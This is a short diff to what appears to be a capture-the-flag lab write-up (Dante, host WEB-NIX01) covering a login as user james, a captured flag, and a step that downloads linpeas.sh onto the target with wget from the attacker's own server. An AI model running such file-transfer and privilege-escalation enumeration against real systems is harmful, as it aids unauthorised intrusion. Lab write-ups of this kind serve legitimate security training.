@@ -594,7 +594,9 @@ cat flag.txt
 DANTE{j4m3s_xxxxxxxxxxxxxxxxxxxx!}
 ```
 
-15. We will do some basic privesc enumeration by transferring over the `linpeas.sh` script. We start a python server on our local machine and use wget to download the script onto WEB-NIX01.
+We login as james successfully and even get a flag!
+
+15. Now let's do some basic privesc enumeration by transferring over the `linpeas.sh` script. We start a python server on our local machine and use wget to download the script onto WEB-NIX01.
 
 `wget http://[IP]/linpeas.sh`
 
